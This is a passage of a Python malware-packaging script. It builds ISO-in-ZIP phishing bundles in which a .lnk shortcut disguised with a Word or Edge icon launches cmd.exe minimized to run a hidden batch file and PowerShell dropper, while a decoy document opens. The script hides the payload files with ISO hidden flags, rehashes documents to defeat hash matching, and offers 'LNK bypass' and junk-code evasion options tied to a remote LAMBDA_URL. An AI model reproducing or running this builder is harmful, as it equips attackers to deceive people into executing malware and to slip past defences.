    li.write(struct.pack('<I', 0))  # CommonNetworkRelativeLinkOffset
    li.write(struct.pack('<I', common_suffix_offset))
    li.write(vol_id_body)
    li.write(target_bytes)
    li.write(b'\x00')  # common path suffix
    buf.write(li.getvalue())

    # ── StringData (Unicode) ──
    def _write_string_data(s):
        encoded = s.encode('utf-16-le')
        count = len(s)
        buf.write(struct.pack('<H', count))
        buf.write(encoded)

    # RelativePath
    _write_string_data('.\\' + os.path.basename(target))
    # WorkingDir (only if set)
    if working_dir:
        _write_string_data(working_dir)
    # Arguments
    _write_string_data(arguments)
    # IconLocation
    _write_string_data(icon_location)

    return buf.getvalue()


def create_lnk(out_path, target, arguments, icon_location, icon_index, working_dir=None, window_style=1):
    """Create a Windows .lnk shortcut file.

    working_dir=None means don't set HasWorkingDir — Windows will use the LNK's
    parent directory as CWD, which is correct for ISO-mounted shortcuts.
    """
    if HAS_PYLNK3:
        kwargs = dict(
            target_file=target,
            lnk_name=out_path,
            arguments=arguments,
            icon_file=icon_location,
            icon_index=icon_index,
        )
        if working_dir:
            kwargs['work_dir'] = working_dir
        lnk = pylnk3.for_file(**kwargs)
        # Patch ShowCommand in the written file (pylnk3 doesn't expose it directly)
        if window_style != 1 and os.path.exists(out_path):
            with open(out_path, 'r+b') as f:
                f.seek(60)
                f.write(struct.pack('<I', window_style))
    else:
        data = _build_lnk_binary(target, arguments, icon_location, icon_index, working_dir, window_style)
        with open(out_path, 'wb') as f:
            f.write(data)


# ====================================================================
#  ISO CREATION (pycdlib with Joliet + hidden flags)
# ====================================================================

def build_iso(iso_path, files, hidden_names):
    """Pack files into a Joliet ISO with hidden flags on specified names.

    files: list of (filename, local_path) tuples
    hidden_names: set of filenames that should be hidden in ISO9660 records
    """
    iso = pycdlib.PyCdlib()
    iso.new(joliet=3, vol_ident='DATA')

    _iso_name_registry.clear()
    added = []  # track (iso9660_path, joliet_path, filename) for hidden pass

    for filename, local_path in files:
        iso_name = _iso9660_name(filename)
        iso9660_path = '/' + iso_name + ';1'
        joliet_path = '/' + filename

        with open(local_path, 'rb') as f:
            data = f.read()

        iso.add_fp(
            fp=io.BytesIO(data),
            length=len(data),
            iso_path=iso9660_path,
            joliet_path=joliet_path,
        )
        added.append((iso9660_path, joliet_path, filename))

    # Set hidden flags after all files are added (public API)
    for iso9660_path, joliet_path, filename in added:
        if filename in hidden_names:
            iso.set_hidden(iso_path=iso9660_path)
            iso.set_hidden(joliet_path=joliet_path)

    iso.write(iso_path)
    iso.close()


_iso_name_registry = set()


def _iso9660_name(filename):
    """Convert a filename to a valid ISO9660 Level 1 name (unique within a session)."""
    name, ext = os.path.splitext(filename)
    clean = ''.join(c for c in name.upper() if c in string.ascii_uppercase + string.digits + '_')
    if not clean:
        clean = 'FILE'
    clean_ext = ''.join(c for c in ext.upper().lstrip('.') if c in string.ascii_uppercase + string.digits + '_')

    if clean_ext:
        base = clean[:8] + '.' + clean_ext[:3]
    else:
        base = clean[:8]

    # Ensure uniqueness within the current ISO
    candidate = base
    counter = 1
    while candidate in _iso_name_registry:
        suffix = str(counter)
        if clean_ext:
            candidate = clean[:8 - len(suffix)] + suffix + '.' + clean_ext[:3]
        else:
            candidate = clean[:8 - len(suffix)] + suffix
        counter += 1
    _iso_name_registry.add(candidate)
    return candidate


# ====================================================================
#  DOCX -> PDF CONVERSION
# ====================================================================

def convert_docx_to_pdf(docx_path, output_dir):
    """Convert a DOCX to PDF. Uses Word on Windows, LibreOffice on Linux."""
    if sys.platform == 'win32':
        from docx2pdf import convert
        basename = os.path.splitext(os.path.basename(docx_path))[0]
        pdf_path = os.path.join(output_dir, basename + '.pdf')
        convert(docx_path, pdf_path)
        return pdf_path
    else:
        lo_bin = shutil.which('libreoffice') or shutil.which('soffice')
        if not lo_bin:
            print('[!] LibreOffice not found: sudo apt install libreoffice-writer')
            sys.exit(1)
        subprocess.run(
            [lo_bin, '--headless', '--convert-to', 'pdf', '--outdir', output_dir, docx_path],
            check=True, capture_output=True,
        )
        basename = os.path.splitext(os.path.basename(docx_path))[0]
        return os.path.join(output_dir, basename + '.pdf')


# ====================================================================
#  MAIN PIPELINE
# ====================================================================

def process_variant(variant_dir, output_dir):
    """Process a single variant folder -> Word .zip + PDF .zip."""
    variant_name = os.path.basename(variant_dir)
    print(f'\n{"="*60}')
    print(f'  Processing: {variant_name}')
    print(f'{"="*60}')

    # Collect DOCX files (sorted for deterministic first-file selection)
    docx_files = sorted(f for f in os.listdir(variant_dir) if f.lower().endswith('.docx'))
    if not docx_files:
        print(f'  [!] No .docx files in {variant_dir}, skipping.')
        return

    first_docx = docx_files[0]
    other_docx = docx_files[1:]

    # ── Step 1: Copy originals to temp (no rehash yet) ──
    print('  [*] Step 1: Copy DOCX originals...')
    tmpdir = tempfile.mkdtemp(prefix=f'exam-gen-{variant_name}-')
    try:
        for f in docx_files:
            shutil.copy2(os.path.join(variant_dir, f), os.path.join(tmpdir, f))
            print(f'      ~ {f}')

        # ── Step 2: Build Word package (own cipher + names + rehash) ──
        print('  [*] Step 2: Build Word package...')
        w_bat = random_short_name() + '.bat'
        w_ps1 = random_short_name() + '.ps1'
        w_decoy = random_short_name() + '.docx'
        w_enc, w_dec = generate_cipher_map()
        if DELIVERY_METHOD == 'base64_recycle':
            w_ps1_content = generate_ps1_recycle(w_enc, w_dec)
        else:
            w_ps1_content = generate_ps1(w_enc, w_dec)
        print(f'      [word] bat={w_bat}, ps1={w_ps1}, decoy={w_decoy} method={DELIVERY_METHOD}')

        word_pkg_dir = os.path.join(tmpdir, '_word_pkg')
        os.makedirs(word_pkg_dir)

        # Copy & rehash each DOCX independently for this package
        shutil.copy2(os.path.join(tmpdir, first_docx), os.path.join(word_pkg_dir, w_decoy))
        rehash_docx(os.path.join(word_pkg_dir, w_decoy))
        for f in other_docx:
            shutil.copy2(os.path.join(tmpdir, f), os.path.join(word_pkg_dir, f))
            rehash_docx(os.path.join(word_pkg_dir, f))

        # Generate BAT
        bat_content = generate_bat(w_decoy, w_ps1)
        bat_path = os.path.join(word_pkg_dir, w_bat)
        with open(bat_path, 'w', encoding='utf-8') as f:
            f.write(bat_content)

        # Write PS1
        ps1_path = os.path.join(word_pkg_dir, w_ps1)
        with open(ps1_path, 'w', encoding='utf-8') as f:
            f.write(w_ps1_content)

        # Create LNK (Word icon)
        lnk_name = os.path.splitext(first_docx)[0] + '.lnk'
        lnk_path = os.path.join(word_pkg_dir, lnk_name)
        if LNK_BYPASS:
            lnk_args = f'/c ".\\{w_bat}"'
            lnk_ws = 7   # SW_SHOWMINNOACTIVE
        else:
            lnk_args = f'/c "start /min .\\{w_bat}"'
            lnk_ws = 1   # SW_SHOWNORMAL
        create_lnk(
            out_path=lnk_path,
            target='C:\\Windows\\System32\\cmd.exe',
            arguments=lnk_args,
            icon_location='%SystemRoot%\\System32\\SHELL32.dll',
            icon_index=1,
            working_dir=None,
            window_style=lnk_ws,
        )
        print(f'      LNK: {lnk_name} (Word icon)')

        # Build ISO
        iso_files = []
        hidden_set = {w_bat, w_ps1, w_decoy}
        iso_files.append((w_bat, bat_path))
        iso_files.append((w_ps1, ps1_path))
        iso_files.append((w_decoy, os.path.join(word_pkg_dir, w_decoy)))
        iso_files.append((lnk_name, lnk_path))
        for f in other_docx:
            iso_files.append((f, os.path.join(word_pkg_dir, f)))

        word_iso_path = os.path.join(tmpdir, f'{variant_name}.iso')
        build_iso(word_iso_path, iso_files, hidden_set)
        print(f'      ISO built: {variant_name}.iso')

        # Pack ISO -> ZIP
        word_zip_path = os.path.join(output_dir, f'{variant_name}.zip')
        with zipfile.ZipFile(word_zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(word_iso_path, f'{variant_name}.iso')
        print(f'      ZIP: {word_zip_path}')

        # ── Step 3: Build PDF package (own cipher + names) ──
        print('  [*] Step 3: Build PDF package...')
        p_bat = random_short_name() + '.bat'
        p_ps1 = random_short_name() + '.ps1'
        p_decoy = random_short_name() + '.pdf'
        p_enc, p_dec = generate_cipher_map()
        if DELIVERY_METHOD == 'base64_recycle':
            p_ps1_content = generate_ps1_recycle(p_enc, p_dec)
        else:
            p_ps1_content = generate_ps1(p_enc, p_dec)
        print(f'      [pdf]  bat={p_bat}, ps1={p_ps1}, decoy={p_decoy} method={DELIVERY_METHOD}')

        pdf_pkg_dir = os.path.join(tmpdir, '_pdf_pkg')
        os.makedirs(pdf_pkg_dir)

        # Copy & rehash DOCX independently for PDF conversion
        pdf_src_dir = os.path.join(tmpdir, '_pdf_src')
        os.makedirs(pdf_src_dir)
        for f in docx_files:
            shutil.copy2(os.path.join(tmpdir, f), os.path.join(pdf_src_dir, f))
            rehash_docx(os.path.join(pdf_src_dir, f))

        # Convert rehashed DOCX -> PDF
        pdf_convert_dir = os.path.join(tmpdir, '_pdf_convert')
        os.makedirs(pdf_convert_dir)
        pdf_map = {}  # original docx name -> pdf filename
        for f in docx_files:
            src_docx = os.path.join(pdf_src_dir, f)
            pdf_path = convert_docx_to_pdf(src_docx, pdf_convert_dir)
            pdf_name = os.path.basename(pdf_path)
            pdf_map[f] = pdf_name
            print(f'      Converted: {f} -> {pdf_name}')

        first_pdf = pdf_map[first_docx]
        other_pdfs = [pdf_map[f] for f in other_docx]

        # Rename first PDF -> random decoy name (hidden)
        shutil.copy2(os.path.join(pdf_convert_dir, first_pdf), os.path.join(pdf_pkg_dir, p_decoy))
        # Copy other PDFs as-is (visible)
        for f in other_pdfs:
            shutil.copy2(os.path.join(pdf_convert_dir, f), os.path.join(pdf_pkg_dir, f))

        # Generate BAT (opens decoy pdf)
        bat_content_pdf = generate_bat(p_decoy, p_ps1)
        bat_path_pdf = os.path.join(pdf_pkg_dir, p_bat)
        with open(bat_path_pdf, 'w', encoding='utf-8') as f:
            f.write(bat_content_pdf)

        # Write PS1 (own dropper)
        ps1_path_pdf = os.path.join(pdf_pkg_dir, p_ps1)
        with open(ps1_path_pdf, 'w', encoding='utf-8') as f:
            f.write(p_ps1_content)

        # Create LNK (Edge icon)
        lnk_name_pdf = os.path.splitext(first_docx)[0] + '.lnk'
        lnk_path_pdf = os.path.join(pdf_pkg_dir, lnk_name_pdf)
        if LNK_BYPASS:
            lnk_args_pdf = f'/c ".\\{p_bat}"'
            lnk_ws_pdf = 7   # SW_SHOWMINNOACTIVE
        else:
            lnk_args_pdf = f'/c "start /min .\\{p_bat}"'
            lnk_ws_pdf = 1   # SW_SHOWNORMAL
        create_lnk(
            out_path=lnk_path_pdf,
            target='C:\\Windows\\System32\\cmd.exe',
            arguments=lnk_args_pdf,
            icon_location='%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe',
            icon_index=11,
            working_dir=None,
            window_style=lnk_ws_pdf,
        )
        print(f'      LNK: {lnk_name_pdf} (Edge icon)')

        # Build ISO
        pdf_iso_files = []
        pdf_hidden_set = {p_bat, p_ps1, p_decoy}
        pdf_iso_files.append((p_bat, bat_path_pdf))
        pdf_iso_files.append((p_ps1, ps1_path_pdf))
        pdf_iso_files.append((p_decoy, os.path.join(pdf_pkg_dir, p_decoy)))
        pdf_iso_files.append((lnk_name_pdf, lnk_path_pdf))
        for f in other_pdfs:
            pdf_iso_files.append((f, os.path.join(pdf_pkg_dir, f)))

        pdf_iso_path = os.path.join(tmpdir, f'{variant_name}_pdf.iso')
        build_iso(pdf_iso_path, pdf_iso_files, pdf_hidden_set)
        print(f'      ISO built: {variant_name}_pdf.iso')

        # Pack ISO -> ZIP
        pdf_zip_path = os.path.join(output_dir, f'{variant_name}_pdf.zip')
        with zipfile.ZipFile(pdf_zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(pdf_iso_path, f'{variant_name}_pdf.iso')
        print(f'      ZIP: {pdf_zip_path}')

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    print(f'  [+] {variant_name} done!')


def main():
    # Validate required config
    if not LAMBDA_URL:
        print('[!] LAMBDA_URL is not set. Export it or add to .env file.')
        sys.exit(1)
    if not API_KEY:
        print('[!] API_KEY is not set. Export it or add to .env file.')
        sys.exit(1)

    if DELIVERY_METHOD not in ('webclient', 'base64_recycle'):
        print(f'[!] Unknown DELIVERY_METHOD: {DELIVERY_METHOD}')
        print('    Valid options: webclient, base64_recycle')
        sys.exit(1)

    # Resolve paths relative to script location
    script_dir = os.path.dirname(os.path.abspath(__file__))
    variants_dir = os.path.join(script_dir, VARIANTS_DIR) if not os.path.isabs(VARIANTS_DIR) else VARIANTS_DIR
    output_dir = os.path.join(script_dir, OUTPUT_DIR) if not os.path.isabs(OUTPUT_DIR) else OUTPUT_DIR

    os.makedirs(output_dir, exist_ok=True)

    # Find variant folders
    if not os.path.isdir(variants_dir):
        print(f'[!] Variants directory not found: {variants_dir}')
        sys.exit(1)

    variant_dirs = sorted(
        os.path.join(variants_dir, d)
        for d in os.listdir(variants_dir)
        if os.path.isdir(os.path.join(variants_dir, d))
    )

    if not variant_dirs:
        print(f'[!] No variant folders found in {variants_dir}')
        sys.exit(1)

    print(f'[*] Found {len(variant_dirs)} variant(s) in {variants_dir}')
    print(f'[*] Output: {output_dir}')
    print(f'[*] Lambda URL: {LAMBDA_URL}')
    print(f'[*] Target filename: {TARGET_FILENAME}')
    print(f'[*] Delivery method: {DELIVERY_METHOD}')
    print(f'[*] LNK bypass:      {"ON" if LNK_BYPASS else "off"}')
    print(f'[*] Junk code:       {"ON" if JUNK_CODE else "off"}')

    for vd in variant_dirs:
        process_variant(vd, output_dir)

    print(f'\n{"="*60}')
    print(f'  ALL DONE — {len(variant_dirs)} variant(s) processed')
    print(f'{"="*60}\n')


if __name__ == '__main__':
    main()
